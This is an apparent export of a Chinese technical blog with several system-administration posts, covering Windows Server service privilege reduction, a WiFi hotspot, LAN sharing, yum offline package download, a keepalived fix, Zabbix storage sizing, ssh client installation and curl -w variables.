<p> 7、假设你有一个WEB目录，路径是d:\web。那么在这个目录的“安全设定”里除了管理员和IIS用户都删除掉，再加入ftptest帐号，切记SYSTEM帐号也删除掉。为什么要这样设置呢？因为现在已经是用ftptest帐号启动的SERV－U，而不是用SYSTEM权限启动的了，所以访问目录不再是用SYSTEM而是用ftptest，此时SYSTEM已经没有用了，这样就算真的溢出也不可能得到SYSTEM权限。</p>
<p>同时，虚拟主机上WEB目录所在盘的根目录还要设置允许ftptest帐号的浏览和读取权限(除了完全控制，更改权限，取得所有权限，遍历文件夹/运行文件)，并确认在高级里设置只有该文件夹。</p>
<h3 id="降权apache"><a href="#降权apache" class="headerlink" title="降权apache"></a>降权apache</h3><p>net user apache 0xls /add</p>
<p>net localgroup users apache /del</p>
<p>建立了一个不属于任何组的用户apche。</p>
<p>打开计算机管理器—-服务—-apache服务的属性—-选择log on，选择this account</p>
<p>填入上面所建立的账户和密码，重启apache服务，现在apache运行在低权限下了。</p>
<h3 id="降权mysql"><a href="#降权mysql" class="headerlink" title="降权mysql"></a>降权mysql</h3><p>1.新建一个账户，给他不要给任何的权限,不加入任何组</p>
<p>2,给mysql目录只给 system跟administrator跟你新建这个用户权限 </p>
<p>3.右键我的电脑 管理 找到服务里面的mysql 选择登录选项，选择里面此账户登录，点击你刚才新建的账户跟密码，重新启动mysql它就以你刚才新建的用户权限来运行了。</p>
<h3 id="降权tomcat"><a href="#降权tomcat" class="headerlink" title="降权tomcat"></a>降权tomcat</h3><p>1、在用户管理里创建tomcat的普通user用户 </p>
<p>2、打开服务管理,右击我的电脑，选择管理-》服务，选择tomcat，点击以我们创建的tomcat 用户启动服务。 </p>
<p>3、更改tomcat文件的权限设置，我是这样设置的 </p>
<p>D:\tomcat\这是tomcat的本目录，需要给tomcat用户读取权限, </p>
<p>D:\tomcat\temp 给tomcat写入权限 </p>
<p>D:\tomcat\work 给tomcat写入权限 </p>
<p>D:\tomcat\logs 给tomcat写入权限 </p>
<p>其他都是默认的读取、运行权限 </p>
<p>4、配置jdk目录读取权限 </p>
<p>d:\setting\Java 给予tomcat读取权限 </p>
<p>5、配置JAVA网站的访问读取权限，如果有上传图片路径，给予写入权限 </p>
<p>6、重新启动tomcat就可以了 </p>
<h2 id="8、修改系统管理员账号名称"><a href="#8、修改系统管理员账号名称" class="headerlink" title="8、修改系统管理员账号名称"></a>8、修改系统管理员账号名称</h2><p>按下“win+r”呼出“运行”框，输入“netplwiz”并点击确定，得到如下界面</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200907091603601.png" alt="image-20200907091603601"></p>
<p>然后选中想要更名的用户，点击“属性”，出现如下图</p>
<p><img src= "/img/loading.gif" data-src="/2020/09/04/Windows%20server%202012%20R2%20%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4/image-20200907091659138.png" alt="image-20200907091659138"></p>
<p>然后进行对应的修改即可</p>
<h2 id="9、安装安全辅助软件"><a href="#9、安装安全辅助软件" class="headerlink" title="9、安装安全辅助软件"></a>9、安装安全辅助软件</h2><p>没有绝对的安全，只有尽量提升安全，人工+软件搭配，才能最大限度提升安全。</p>
<p>根据工作需求判断是否加装安全辅助软件</p>
]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Win10怎么查看WiFi密码</title>
    <url>/2020/10/25/Win10%E6%80%8E%E4%B9%88%E6%9F%A5%E7%9C%8BWiFi%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Win10怎么查看WiFi密码"><a href="#Win10怎么查看WiFi密码" class="headerlink" title="Win10怎么查看WiFi密码"></a>Win10怎么查看WiFi密码</h2><p>1.任务栏的网络图标上，点击鼠标右键，选择打开网络和共享中心，如图</p>
<p>2.网络和共享中心中，直接点击这里当前连接的无线wifi网络图标。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/25/Win10%E6%80%8E%E4%B9%88%E6%9F%A5%E7%9C%8BWiFi%E5%AF%86%E7%A0%81/E:%5Cblog%5Cmyblog%5Csource_posts%5CWin10%E6%80%8E%E4%B9%88%E6%9F%A5%E7%9C%8BWiFi%E5%AF%86%E7%A0%81%5Cimage-20210315105102782.png" alt="image-20210315105102782"></p>
<p>3.wlan状态界面中，我们选择这里的无线属性按钮，打开进入。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/25/Win10%E6%80%8E%E4%B9%88%E6%9F%A5%E7%9C%8BWiFi%E5%AF%86%E7%A0%81/E:%5Cblog%5Cmyblog%5Csource_posts%5CWin10%E6%80%8E%E4%B9%88%E6%9F%A5%E7%9C%8BWiFi%E5%AF%86%E7%A0%81%5Cimage-20210315105143474.png" alt="image-20210315105143474"></p>
<p>4.无线网络属性的安全里面，我们点击这里的显示字符，如图所示</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/25/Win10%E6%80%8E%E4%B9%88%E6%9F%A5%E7%9C%8BWiFi%E5%AF%86%E7%A0%81/E:%5Cblog%5Cmyblog%5Csource_posts%5CWin10%E6%80%8E%E4%B9%88%E6%9F%A5%E7%9C%8BWiFi%E5%AF%86%E7%A0%81%5Cimage-20210315105205141.png" alt="image-20210315105205141"></p>
<p>5.这样密码就显示了出来，现在就可以看到自己连接的无线网络wifi密码。</p>
<p><img src= "/img/loading.gif" data-src="/2020/10/25/Win10%E6%80%8E%E4%B9%88%E6%9F%A5%E7%9C%8BWiFi%E5%AF%86%E7%A0%81/E:%5Cblog%5Cmyblog%5Csource_posts%5CWin10%E6%80%8E%E4%B9%88%E6%9F%A5%E7%9C%8BWiFi%E5%AF%86%E7%A0%81%5Cimage-20210315105229200.png" alt="image-20210315105229200"></p>
]]></content>
      <categories>
        <category>生活小技巧</category>
      </categories>
      <tags>
        <tag>生活小技巧</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows7 无线热点</title>
    <url>/2019/09/17/Windows7%20%E6%97%A0%E7%BA%BF%E7%83%AD%E7%82%B9/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>1、按下“win+r”快捷键打开运行，在运行对话框内输入“cmd”命令回车。</p>
<p><img src= "/img/loading.gif" data-src="/2019/09/17/Windows7%20%E6%97%A0%E7%BA%BF%E7%83%AD%E7%82%B9/image-20200828193100807.png" alt="image-20200828193100807"></p>
<p>2、在命令窗口中输入netsh wlan set hostednetwork mode=allow ssid=mytest key=12345678回车，等待一会这个无线网络就创建好了。</p>
<p><img src= "/img/loading.gif" data-src="/2019/09/17/Windows7%20%E6%97%A0%E7%BA%BF%E7%83%AD%E7%82%B9/image-20200828193122724.png" alt="image-20200828193122724"></p>
<p>3、选择本地连接右键点击选择属性。</p>
<p><img src= "/img/loading.gif" data-src="/2019/09/17/Windows7%20%E6%97%A0%E7%BA%BF%E7%83%AD%E7%82%B9/image-20200828193136098.png" alt="image-20200828193136098"></p>
<p>4、在本地连接中选择一个无线网络通过共享来无线上网，选择无线网络连接2，这样就允许无线网络连接2通过本地连接来连接internet网络。</p>
<p><img src= "/img/loading.gif" data-src="/2019/09/17/Windows7%20%E6%97%A0%E7%BA%BF%E7%83%AD%E7%82%B9/image-20200828193155816.png" alt="image-20200828193155816"></p>
<p>5、配置好无线网络之后，还需要用命令来启动无线网络，以管理员身份进入输入 netsh wlan start hostednetwork。</p>
<p><img src= "/img/loading.gif" data-src="/2019/09/17/Windows7%20%E6%97%A0%E7%BA%BF%E7%83%AD%E7%82%B9/image-20200828193209848.png" alt="image-20200828193209848"></p>
<p>6、这时候在”无线网络连接“里面就可以看到刚才创建的wifi热点了，连接上这个wifi就可以直接使用了。</p>
<p><img src= "/img/loading.gif" data-src="/2019/09/17/Windows7%20%E6%97%A0%E7%BA%BF%E7%83%AD%E7%82%B9/image-20200828193223738.png" alt="image-20200828193223738"></p>
]]></content>
      <categories>
        <category>无线热点</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows局域网创建共享目录教程</title>
    <url>/2018/07/13/Windows%E5%B1%80%E5%9F%9F%E7%BD%91%E5%88%9B%E5%BB%BA%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E6%95%99%E7%A8%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src= "/img/loading.gif" data-src="/2018/07/13/Windows%E5%B1%80%E5%9F%9F%E7%BD%91%E5%88%9B%E5%BB%BA%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E6%95%99%E7%A8%8B/image-20200817173535855.png" alt="image-20200817173535855"></p>
<p>Windows本身（不论是win7还是win10）支持局域网的共享文件，传输速度如下图，</p>
<p><img src= "/img/loading.gif" data-src="/2018/07/13/Windows%E5%B1%80%E5%9F%9F%E7%BD%91%E5%88%9B%E5%BB%BA%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E6%95%99%E7%A8%8B/image-20200817173556978.png" alt="image-20200817173556978"></p>
<p>传了一个4.19G的centos7完整版镜像，速度大概是11M/s左右。</p>
<p>拉取方法如下。</p>
<p>按下win+R 键，出来运行框，输入 \+目标IP</p>
<p><img src= "/img/loading.gif" data-src="/2018/07/13/Windows%E5%B1%80%E5%9F%9F%E7%BD%91%E5%88%9B%E5%BB%BA%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E6%95%99%E7%A8%8B/image-20200817173610979.png" alt="image-20200817173610979"></p>
<h1 id="Win7教程"><a href="#Win7教程" class="headerlink" title="Win7教程"></a>Win7教程</h1><p><img src= "/img/loading.gif" data-src="/2018/07/13/Windows%E5%B1%80%E5%9F%9F%E7%BD%91%E5%88%9B%E5%BB%BA%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E6%95%99%E7%A8%8B/image-20200817173626626.png" alt="image-20200817173626626"></p>
<p><img src= "/img/loading.gif" data-src="/2018/07/13/Windows%E5%B1%80%E5%9F%9F%E7%BD%91%E5%88%9B%E5%BB%BA%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E6%95%99%E7%A8%8B/image-20200817173633826.png" alt="image-20200817173633826"></p>
<p><img src= "/img/loading.gif" data-src="/2018/07/13/Windows%E5%B1%80%E5%9F%9F%E7%BD%91%E5%88%9B%E5%BB%BA%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E6%95%99%E7%A8%8B/image-20200817173640466.png" alt="image-20200817173640466"></p>
<p><img src= "/img/loading.gif" data-src="/2018/07/13/Windows%E5%B1%80%E5%9F%9F%E7%BD%91%E5%88%9B%E5%BB%BA%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E6%95%99%E7%A8%8B/image-20200817173647120.png" alt="image-20200817173647120"></p>
<p><img src= "/img/loading.gif" data-src="/2018/07/13/Windows%E5%B1%80%E5%9F%9F%E7%BD%91%E5%88%9B%E5%BB%BA%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E6%95%99%E7%A8%8B/image-20200817173654560.png" alt="image-20200817173654560"></p>
<p><img src= "/img/loading.gif" data-src="/2018/07/13/Windows%E5%B1%80%E5%9F%9F%E7%BD%91%E5%88%9B%E5%BB%BA%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E6%95%99%E7%A8%8B/image-20200817173705456.png" alt="image-20200817173705456"></p>
<p><img src= "/img/loading.gif" data-src="/2018/07/13/Windows%E5%B1%80%E5%9F%9F%E7%BD%91%E5%88%9B%E5%BB%BA%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E6%95%99%E7%A8%8B/image-20200817173713388.png" alt="image-20200817173713388"></p>
<p><img src= "/img/loading.gif" data-src="/2018/07/13/Windows%E5%B1%80%E5%9F%9F%E7%BD%91%E5%88%9B%E5%BB%BA%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E6%95%99%E7%A8%8B/image-20200817173719555.png" alt="image-20200817173719555"></p>
<p>然后在下方选择 对应的权限（即 来宾可以进行的操作，例如，允不允许上传文件 也就是开不开通写权限 允不允许下载文件 也就是读权限等）</p>
<p><img src= "/img/loading.gif" data-src="/2018/07/13/Windows%E5%B1%80%E5%9F%9F%E7%BD%91%E5%88%9B%E5%BB%BA%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E6%95%99%E7%A8%8B/image-20200817173733202.png" alt="image-20200817173733202"></p>
<p><img src= "/img/loading.gif" data-src="/2018/07/13/Windows%E5%B1%80%E5%9F%9F%E7%BD%91%E5%88%9B%E5%BB%BA%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E6%95%99%E7%A8%8B/image-20200817173740929.png" alt="image-20200817173740929"></p>
<p>设置完成之后就可以让别人进行访问拉取了</p>
<p>按下win+R 键</p>
<p><img src= "/img/loading.gif" data-src="/2018/07/13/Windows%E5%B1%80%E5%9F%9F%E7%BD%91%E5%88%9B%E5%BB%BA%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E6%95%99%E7%A8%8B/image-20200817173756056.png" alt="image-20200817173756056"></p>
<p>如果不知道自己IP，打开VNC-server看就行</p>
<p><img src= "/img/loading.gif" data-src="/2018/07/13/Windows%E5%B1%80%E5%9F%9F%E7%BD%91%E5%88%9B%E5%BB%BA%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E6%95%99%E7%A8%8B/image-20200817173811046.png" alt="image-20200817173811046"></p>
<h1 id="Win10"><a href="#Win10" class="headerlink" title="Win10"></a>Win10</h1><p><img src= "/img/loading.gif" data-src="/2018/07/13/Windows%E5%B1%80%E5%9F%9F%E7%BD%91%E5%88%9B%E5%BB%BA%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E6%95%99%E7%A8%8B/image-20200817173824820.png" alt="image-20200817173824820"></p>
<p><img src= "/img/loading.gif" data-src="/2018/07/13/Windows%E5%B1%80%E5%9F%9F%E7%BD%91%E5%88%9B%E5%BB%BA%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E6%95%99%E7%A8%8B/image-20200817173831825.png" alt="image-20200817173831825"></p>
<p>选择要分享的文件夹右键选择属性</p>
<p><img src= "/img/loading.gif" data-src="/2018/07/13/Windows%E5%B1%80%E5%9F%9F%E7%BD%91%E5%88%9B%E5%BB%BA%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E6%95%99%E7%A8%8B/image-20200817173842707.png" alt="image-20200817173842707"></p>
<p>进行对应的设置</p>
<p><img src= "/img/loading.gif" data-src="/2018/07/13/Windows%E5%B1%80%E5%9F%9F%E7%BD%91%E5%88%9B%E5%BB%BA%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E6%95%99%E7%A8%8B/image-20200817173858679.png" alt="image-20200817173858679"></p>
<p><img src= "/img/loading.gif" data-src="/2018/07/13/Windows%E5%B1%80%E5%9F%9F%E7%BD%91%E5%88%9B%E5%BB%BA%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E6%95%99%E7%A8%8B/image-20200817173906158.png" alt="image-20200817173906158"></p>
<p><img src= "/img/loading.gif" data-src="/2018/07/13/Windows%E5%B1%80%E5%9F%9F%E7%BD%91%E5%88%9B%E5%BB%BA%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E6%95%99%E7%A8%8B/image-20200817173912212.png" alt="image-20200817173912212"></p>
<p>按下win+R输入\+目标IP即可</p>
<p><img src= "/img/loading.gif" data-src="/2018/07/13/Windows%E5%B1%80%E5%9F%9F%E7%BD%91%E5%88%9B%E5%BB%BA%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E6%95%99%E7%A8%8B/image-20200817173924379.png" alt="image-20200817173924379"></p>
<p>如果不知道自己IP，打开VNC-server看就行</p>
<p><img src= "/img/loading.gif" data-src="/2018/07/13/Windows%E5%B1%80%E5%9F%9F%E7%BD%91%E5%88%9B%E5%BB%BA%E5%85%B1%E4%BA%AB%E7%9B%AE%E5%BD%95%E6%95%99%E7%A8%8B/image-20200817173936034.png" alt="image-20200817173936034"></p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>Yum只下载安装包并保存到特定目录</title>
    <url>/2018/07/05/Yum%E5%8F%AA%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85%E5%8C%85%E5%B9%B6%E4%BF%9D%E5%AD%98%E5%88%B0%E7%89%B9%E5%AE%9A%E7%9B%AE%E5%BD%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>老规矩，先上</p>
<h5 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install --downloadonly --downloaddir=/yum gcc gcc-c++ autoconf automake</span><br><span class="line"><span class="meta">#</span><span class="bash">注：</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果--downloaddir设置的目录不存在，会自动创建目录</span></span><br></pre></td></tr></table></figure>

<h5 id="问题描述："><a href="#问题描述：" class="headerlink" title="问题描述："></a>问题描述：</h5><p>今天需要在公司内网上编译安装redis去中心化集群，但是内网上新的服务器没有对应的编译环境，我一开始是想要在yum的配置文件中打开对应的参数keepcache=1，将yum的缓存打开，然后在自己机器上安装对应的软件，还可以自动解决依赖关系，但唯一的缺点是下载下来的安装包会自动安装，而且下载下来的包位置在哪个地方都有，需要用find命令找出来在进行copy，比较麻烦。今天使用的一种新的方法。</p>
<h5 id="命令展示："><a href="#命令展示：" class="headerlink" title="命令展示："></a>命令展示：</h5><p>前两张图补了之前的截图，因为当时下包的时候没有截图</p>
<p><img src= "/img/loading.gif" data-src="/2018/07/05/Yum%E5%8F%AA%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85%E5%8C%85%E5%B9%B6%E4%BF%9D%E5%AD%98%E5%88%B0%E7%89%B9%E5%AE%9A%E7%9B%AE%E5%BD%95/image-20200815204901255.png" alt="image-20200815204901255"></p>
<p>如上图可以看到，这条命令自动解决了依赖关系</p>
<p><img src= "/img/loading.gif" data-src="/2018/07/05/Yum%E5%8F%AA%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85%E5%8C%85%E5%B9%B6%E4%BF%9D%E5%AD%98%E5%88%B0%E7%89%B9%E5%AE%9A%E7%9B%AE%E5%BD%95/image-20200815205005751.png" alt="image-20200815205005751"></p>
<p>如上图可以看到，该操作只进行了下载</p>
<p><img src= "/img/loading.gif" data-src="/2018/07/05/Yum%E5%8F%AA%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85%E5%8C%85%E5%B9%B6%E4%BF%9D%E5%AD%98%E5%88%B0%E7%89%B9%E5%AE%9A%E7%9B%AE%E5%BD%95/clip_image002-1597496089190.png" alt="img"></p>
<p>如上图可以看到，下载下来对应的安装包都在该目录下</p>
<p>然后将该目录下的文件scp或者使用U盘，发送到其他服务器上就可以安装使用了</p>
<p>使用命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpm -Uvh *.rpm --nodeps --force</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2018/07/05/Yum%E5%8F%AA%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85%E5%8C%85%E5%B9%B6%E4%BF%9D%E5%AD%98%E5%88%B0%E7%89%B9%E5%AE%9A%E7%9B%AE%E5%BD%95/clip_image002.png" alt="img"></p>
<p>验证一下是否成功，使用gcc -v</p>
<p><img src= "/img/loading.gif" data-src="/2018/07/05/Yum%E5%8F%AA%E4%B8%8B%E8%BD%BD%E5%AE%89%E8%A3%85%E5%8C%85%E5%B9%B6%E4%BF%9D%E5%AD%98%E5%88%B0%E7%89%B9%E5%AE%9A%E7%9B%AE%E5%BD%95/clip_image002-1597496076689.png" alt="img"></p>
]]></content>
      <categories>
        <category>Yum</category>
      </categories>
      <tags>
        <tag>Yum</tag>
      </tags>
  </entry>
  <entry>
    <title>yum安装的keepalived 使用systemctl无法停掉其后台进程</title>
    <url>/2018/09/12/Yum%E5%AE%89%E8%A3%85%E7%9A%84keepalived%20%E4%BD%BF%E7%94%A8systemctl%E6%97%A0%E6%B3%95%E5%81%9C%E6%8E%89%E5%85%B6%E5%90%8E%E5%8F%B0%E8%BF%9B%E7%A8%8B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>我使用的是阿里源，yum安装的keepalived</p>
<h5 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h5><p>起初是测试vip漂移时候发现，主备节点都开启keepalived的状况下，一切正常，master的vip也可以访问，当停掉master的keepalived时，发现vip无法漂移到slave，检查进程时，发现keepalived的进程依然还在，出现了双VIP（脑裂）的现象。</p>
<h5 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h5><p>1、这时候想到应该是systemd启动服务脚本的问题，查看keepalived的启动service文件</p>
<p>路径：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> vim /usr/lib/systemd/system/keepalived.service</span></span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2018/09/12/Yum%E5%AE%89%E8%A3%85%E7%9A%84keepalived%20%E4%BD%BF%E7%94%A8systemctl%E6%97%A0%E6%B3%95%E5%81%9C%E6%8E%89%E5%85%B6%E5%90%8E%E5%8F%B0%E8%BF%9B%E7%A8%8B/image-20200817183113622.png" alt="image-20200817183113622"></p>
<p>2、注释掉一行<br>KillMode=process的大致意思是当停止keepalived的时候只会停掉主进程，而主进程产生的子进程是不会被干掉的。而killmode的默认值是control-group，意思时所有进程都会被干掉，我这里选择把这项注释掉。</p>
<p><img src= "/img/loading.gif" data-src="/2018/09/12/Yum%E5%AE%89%E8%A3%85%E7%9A%84keepalived%20%E4%BD%BF%E7%94%A8systemctl%E6%97%A0%E6%B3%95%E5%81%9C%E6%8E%89%E5%85%B6%E5%90%8E%E5%8F%B0%E8%BF%9B%E7%A8%8B/image-20200817183150954.png" alt="image-20200817183150954"></p>
<p>然后重载配置</p>
<p>systemctl daemon-reload</p>
<p>这样设置完成之后有在停掉keepalived进程就不会再出现双VIP的现象了</p>
]]></content>
      <categories>
        <category>Keepalived</category>
      </categories>
      <tags>
        <tag>Keepalived</tag>
      </tags>
  </entry>
  <entry>
    <title>Zabbix数据库空间大小使用计算</title>
    <url>/2018/12/28/Zabbix%E6%95%B0%E6%8D%AE%E5%BA%93%E7%A9%BA%E9%97%B4%E5%A4%A7%E5%B0%8F%E4%BD%BF%E7%94%A8%E8%AE%A1%E7%AE%97/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Zabbix数据库空间大小使用计算"><a href="#Zabbix数据库空间大小使用计算" class="headerlink" title="Zabbix数据库空间大小使用计算"></a>Zabbix数据库空间大小使用计算</h1><h2 id="一、Zabbix的数据存储主要分类"><a href="#一、Zabbix的数据存储主要分类" class="headerlink" title="一、Zabbix的数据存储主要分类"></a>一、Zabbix的数据存储主要分类</h2><p>　　1.历史数据</p>
<p>　　2.趋势数据</p>
<p>　　3.事件数据</p>
<h2 id="二、每秒处理的数据量"><a href="#二、每秒处理的数据量" class="headerlink" title="二、每秒处理的数据量"></a>二、每秒处理的数据量</h2><p>　　顾名思义，例如，有3000个监控项(item)，每60秒取一次值，即平均每秒有50(3000/60)个数据要处理，及每秒有50条数据要插入数据库中</p>
<p>　　计算公式:每秒数据量 = 总的监控项 / 取值时间</p>
<h2 id="三、历史数据"><a href="#三、历史数据" class="headerlink" title="三、历史数据"></a>三、历史数据</h2><p>　　历史数据定义</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">每个监控项的取值数据都要记录下来，这些记录一般保留几周到几个月，每条历史数据需要占用大概50个字节(Bytes)</span><br></pre></td></tr></table></figure>

<p>　　假如历史数据你要保留90天，有3000个监控项，监控间隔60秒，(即每秒处理数据量=3000/60=50个)</p>
<p>　　3000/60 *3600 *24 *90 *50=18GB</p>
<p>　　计算公式：每秒处理的数据量 * 3600秒 * 24小时 *天数 * 50Bytes = 历史数据存储量</p>
<h2 id="四、趋势数据"><a href="#四、趋势数据" class="headerlink" title="四、趋势数据"></a>四、趋势数据</h2><p>　　趋势数据定义</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当你查看一周或者一个月的图表，图表上看到的MAX&#x2F;MIN&#x2F;AVG&#x2F;COUNT都是来源趋势数据，趋势数据存储间隔是1次&#x2F;小时，趋势数据每条记录数据大约占用128字节(Bytes)</span><br></pre></td></tr></table></figure>

<p>　　假如有3000个监控项（即会产生3000条/h趋势数据），想保留1年的趋势数据，大约需要多少空间？</p>
<p>　　3000个 * 24小时 * 365天 *128字节 = 3GB</p>
<p>　　计算公式：每小时要记录的趋势数据条数 * 24小时 * 天数 * 128字节</p>
<h2 id="五、事件数据"><a href="#五、事件数据" class="headerlink" title="五、事件数据"></a>五、事件数据</h2><p>　　事件数据定义</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">指的是报警、警告、恢复等等事件，一个事件大概占用130字节(Bytes)</span><br></pre></td></tr></table></figure>

<p>　　假如，平均1秒钟产生一条事件，想要保存事件数据1年</p>
<p>　　3600秒 * 24小时 * 365天 * 130字节 = 3.8GB</p>
<p>　　计算公式：每秒事件个数 * 3600秒 * 24小时 *天数 *130字节</p>
<p>　</p>
<h2 id="六、数据库硬盘空间大小"><a href="#六、数据库硬盘空间大小" class="headerlink" title="六、数据库硬盘空间大小"></a>六、数据库硬盘空间大小</h2><p>　　数据库硬盘空间 = 配置文件大小 + 历史数据大小 + 趋势记录大小 + 事件记录大小</p>
<p>　　关于配置文件大小(Zabbix配置)，很小，基本可以忽略不记。</p>
]]></content>
      <categories>
        <category>zabbix</category>
      </categories>
      <tags>
        <tag>zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title>centos6.10使用ssh连接报错</title>
    <url>/2020/10/09/centos6.10%E4%BD%BF%E7%94%A8ssh%E8%BF%9E%E6%8E%A5%E6%8A%A5%E9%94%99/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>centos6.10 使用ssh 连接远程服务器提示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-bash: ssh: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure>

<p>centos默认安装有ssh服务，没有客户端。</p>
<p>查看ssh安装</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rpm -qa | grep openssh</span></span><br><span class="line"></span><br><span class="line">openssh-5.3p1-123.el6_9.x86_64</span><br><span class="line"></span><br><span class="line">openssh-server-5.3p1-123.el6_9.x86_64</span><br></pre></td></tr></table></figure>

<p>没有安装openssh-clients</p>
<p>yum安装ssh客户端</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install openssh-clients</span><br><span class="line">ssh root@127.0.0.1</span><br><span class="line"></span><br><span class="line">root@127.0.0.1<span class="string">'s password: </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">输入密码后成功连接</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ssh</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title>curl -w 参数详解</title>
    <url>/2019/10/02/curl%20-w%20%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CURL-w-参数详解"><a href="#CURL-w-参数详解" class="headerlink" title="CURL -w 参数详解"></a>CURL -w 参数详解</h1><p><strong>通过CURL命令可以方便的查询各种http请求的问题，-w参数对于我们诊断问题非常重要，以下是-w参数对应的一些变量以及对应的解释：</strong></p>
<ol>
<li><strong>url_effective</strong> 最终获取的url地址，尤其是当你指定给curl的地址存在301跳转，且通过-L继续追踪的情形。</li>
<li><strong>http_code</strong> http状态码，如200成功,301转向,404未找到,500服务器错误等。(The numerical response code that was found in the last retrieved HTTP(S) or FTP(s) transfer. In 7.18.2 the alias response_code was added to show the same info.)</li>
<li><strong>http_connect</strong> The numerical code that was found in the last response (from a proxy) to a curl CONNECT request. (Added in 7.12.4)</li>
<li><strong>time_total</strong> 总时间，按秒计。精确到小数点后三位。 （The total time, in seconds, that the full operation lasted. The time will be displayed with millisecond resolution.）</li>
<li><strong>time_namelookup</strong> DNS解析时间,从请求开始到DNS解析完毕所用时间。(The time, in seconds, it took from the start until the name resolving was completed.)</li>
